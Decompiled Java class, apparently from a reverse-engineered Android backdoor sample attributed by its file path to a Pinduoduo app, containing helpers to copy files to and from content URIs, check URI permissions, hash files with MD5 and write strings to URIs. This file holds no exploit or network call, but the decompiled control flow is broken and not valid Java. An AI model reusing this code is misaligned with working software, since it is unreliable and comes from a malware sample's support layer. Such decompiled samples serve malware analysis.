package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.text.TextUtils;
import java.io.Closeable;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.util.Locale;

public class FileFpUtil {
  private static final int READ_BUFFER_SIZE = 8192;
  
  public static Uri buildGrantedUri(Uri paramUri, String paramString) {
    Uri uri = paramUri;
    if (paramUri != null) {
      if (TextUtils.isEmpty(paramString))
        return paramUri; 
      Uri.Builder builder = paramUri.buildUpon();
      String str = paramString;
      if (paramString.startsWith("/"))
        str = paramString.substring(1); 
      uri = builder.appendEncodedPath(str).build();
    } 
    return uri;
  }
  
  public static String bytesToHexString(byte[] paramArrayOfbyte) {
    if (paramArrayOfbyte == null || paramArrayOfbyte.length == 0)
      return null; 
    StringBuilder stringBuilder = new StringBuilder();
    int j = paramArrayOfbyte.length;
    for (int i = 0; i < j; i++) {
      String str = Integer.toHexString(paramArrayOfbyte[i] & 0xFF);
      if (str.length() < 2)
        stringBuilder.append(0); 
      stringBuilder.append(str);
    } 
    return stringBuilder.toString();
  }
  
  public static boolean checkHasPermission(Context paramContext, Uri paramUri) {
    return (paramContext.checkCallingOrSelfUriPermission(paramUri, 3) == 0);
  }
  
  public static boolean copyFile(Context paramContext, Uri paramUri, File paramFile) {
    Exception exception1;
    ParcelFileDescriptor parcelFileDescriptor = getPfdByUri(paramContext, paramUri, "r");
    boolean bool1 = false;
    boolean bool2 = false;
    if (parcelFileDescriptor == null)
      return false; 
    Exception exception3 = null;
    Exception exception2 = null;
    try {
      Exception exception4;
      Exception exception5;
      FileDescriptor fileDescriptor = parcelFileDescriptor.getFileDescriptor();
      if (fileDescriptor == null)
        return bool1; 
      FileInputStream fileInputStream = new FileInputStream(fileDescriptor);
      try {
        FileInputStream fileInputStream1;
        FileOutputStream fileOutputStream = new FileOutputStream(paramFile);
        try {
          bool2 = copyFileByStream(fileInputStream, fileOutputStream);
          if (bool2)
            bool1 = true; 
        } catch (Exception null) {
        
        } finally {
          exception2 = null;
          fileInputStream1 = fileInputStream;
        } 
        safetyClose(fileOutputStream);
        safetyClose(fileInputStream1);
        safetyClosePfd(parcelFileDescriptor);
        throw exception4;
      } catch (Exception null) {
      
      } finally {
        exception3 = null;
        exception1 = exception2;
        exception5 = exception4;
      } 
      safetyClose((Closeable)exception1);
      safetyClose((Closeable)exception5);
      safetyClosePfd(parcelFileDescriptor);
      throw exception4;
    } catch (Exception exception) {
    
    } finally {
      paramFile = null;
      exception1 = exception2;
      safetyClose((Closeable)exception1);
      safetyClose((Closeable)paramFile);
      safetyClosePfd(parcelFileDescriptor);
    } 
    safetyClose((Closeable)exception1);
    safetyClose((Closeable)paramContext);
    safetyClosePfd(parcelFileDescriptor);
    return false;
  }
  
  public static boolean copyFile(Context paramContext, File paramFile, Uri paramUri) {
    FileOutputStream fileOutputStream1;
    FileOutputStream fileOutputStream2;
    if (!paramFile.exists())
      return false; 
    ParcelFileDescriptor parcelFileDescriptor = getPfdByUri(paramContext, paramUri, "w");
    if (parcelFileDescriptor == null)
      return false; 
    paramUri = null;
    try {
      FileOutputStream fileOutputStream;
      FileDescriptor fileDescriptor1;
      FileInputStream fileInputStream2;
      FileDescriptor fileDescriptor2 = parcelFileDescriptor.getFileDescriptor();
      if (fileDescriptor2 == null)
        return false; 
      FileInputStream fileInputStream1 = new FileInputStream(paramFile);
      try {
        FileDescriptor fileDescriptor;
        FileOutputStream fileOutputStream3 = new FileOutputStream(fileDescriptor2);
        try {
          return true;
        } catch (Exception exception) {
        
        } finally {
          fileDescriptor2 = null;
          fileInputStream2 = fileInputStream1;
          fileOutputStream = fileOutputStream3;
        } 
        safetyClose(fileOutputStream);
        safetyClose(fileInputStream2);
        safetyClosePfd(parcelFileDescriptor);
        throw fileDescriptor;
      } catch (Exception exception) {
      
      } finally {
        paramFile = null;
        fileDescriptor2 = null;
        fileOutputStream2 = fileOutputStream;
      } 
      safetyClose((Closeable)fileDescriptor1);
      safetyClose(fileOutputStream2);
      safetyClosePfd(parcelFileDescriptor);
      throw paramFile;
    } catch (Exception exception) {
    
    } finally {
      fileOutputStream2 = null;
      fileOutputStream1 = fileOutputStream2;
      safetyClose(fileOutputStream1);
      safetyClose(fileOutputStream2);
      safetyClosePfd(parcelFileDescriptor);
    } 
    safetyClose((Closeable)paramFile);
    safetyClose(fileOutputStream1);
    safetyClosePfd(parcelFileDescriptor);
    return false;
  }
  
  private static boolean copyFileByStream(FileInputStream paramFileInputStream, FileOutputStream paramFileOutputStream) {
    try {
      byte[] arrayOfByte = new byte[8192];
      while (true) {
        int i = paramFileInputStream.read(arrayOfByte);
        if (i > 0) {
          paramFileOutputStream.write(arrayOfByte, 0, i);
          continue;
        } 
        paramFileOutputStream.flush();
        return true;
      } 
    } catch (Exception exception) {
      return false;
    } 
  }
  
  public static String getFileMd5(Context paramContext, Uri paramUri) {
    if (paramUri == null)
      return null; 
    ParcelFileDescriptor parcelFileDescriptor = getPfdByUri(paramContext, paramUri, "r");
    if (parcelFileDescriptor == null)
      return null; 
    try {
      FileDescriptor fileDescriptor = parcelFileDescriptor.getFileDescriptor();
      if (fileDescriptor == null)
        return null; 
      String str = getStreamMd5(new FileInputStream(fileDescriptor));
      boolean bool = TextUtils.isEmpty(str);
    } catch (Exception exception) {
    
    } finally {
      safetyClosePfd(parcelFileDescriptor);
    } 
    safetyClosePfd(parcelFileDescriptor);
    return null;
  }
  
  public static ParcelFileDescriptor getPfdByUri(Context paramContext, Uri paramUri, String paramString) {
    try {
      return paramContext.getContentResolver().openFileDescriptor(paramUri, paramString);
    } catch (Exception exception) {
      return null;
    } 
  }
  
  private static String getStreamMd5(FileInputStream paramFileInputStream) {
    try {
      MessageDigest messageDigest = MessageDigest.getInstance("MD5");
      byte[] arrayOfByte = new byte[8192];
      while (true) {
        int i = paramFileInputStream.read(arrayOfByte);
        if (i > 0) {
          messageDigest.update(arrayOfByte, 0, i);
          continue;
        } 
        String str2 = bytesToHexString(messageDigest.digest());
        String str1 = str2;
        if (str2 != null)
          str1 = str2.toLowerCase(Locale.ROOT); 
        return str1;
      } 
    } catch (Exception exception) {
      return null;
    } finally {
      safetyClose(paramFileInputStream);
    } 
  }
  
  public static void safetyClose(Closeable paramCloseable) {
    if (paramCloseable != null)
      try {
        paramCloseable.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  public static void safetyClosePfd(ParcelFileDescriptor paramParcelFileDescriptor) {
    if (paramParcelFileDescriptor != null)
      try {
        paramParcelFileDescriptor.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  public static boolean writeFile(Context paramContext, String paramString, Uri paramUri) {
    StringBuilder stringBuilder;
    ParcelFileDescriptor parcelFileDescriptor = getPfdByUri(paramContext, paramUri, "w");
    if (parcelFileDescriptor == null) {
      stringBuilder = new StringBuilder();
      stringBuilder.append("get dest pdf fail: ");
      stringBuilder.append(paramUri);
      DynamicUtils.debugLog(stringBuilder.toString());
      return false;
    } 
    try {
      FileDescriptor fileDescriptor = stringBuilder.getFileDescriptor();
      if (fileDescriptor == null) {
        DynamicUtils.debugLog("get dest fd fail.");
        safetyClosePfd((ParcelFileDescriptor)stringBuilder);
        return false;
      } 
      if (!writeFileByStream(paramString, new FileOutputStream(fileDescriptor))) {
        StringBuilder stringBuilder2 = new StringBuilder();
        stringBuilder2.append("write file fail: ");
        stringBuilder2.append(paramUri);
        DynamicUtils.debugLog(stringBuilder2.toString());
        safetyClosePfd((ParcelFileDescriptor)stringBuilder);
        return false;
      } 
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.append("write file success: ");
      stringBuilder1.append(paramUri);
      DynamicUtils.debugLog(stringBuilder1.toString());
      safetyClosePfd((ParcelFileDescriptor)stringBuilder);
      return true;
    } catch (Exception exception) {
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.append("write file error: ");
      stringBuilder1.append(paramUri);
      DynamicUtils.debugLog(stringBuilder1.toString(), exception);
      safetyClosePfd((ParcelFileDescriptor)stringBuilder);
      return false;
    } finally {}
    safetyClosePfd((ParcelFileDescriptor)stringBuilder);
    throw paramString;
  }
  
  private static boolean writeFileByStream(String paramString, FileOutputStream paramFileOutputStream) {
    try {
      paramFileOutputStream.write(paramString.getBytes());
      paramFileOutputStream.flush();
      safetyClose(paramFileOutputStream);
      return true;
    } catch (Exception exception) {
      DynamicUtils.debugLog("write file by stream error.", exception);
      safetyClose(paramFileOutputStream);
      return false;
    } finally {}
    safetyClose(paramFileOutputStream);
    throw paramString;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2eb20dc580aaa5186ee4a4ceb2374669-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\FileFpUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */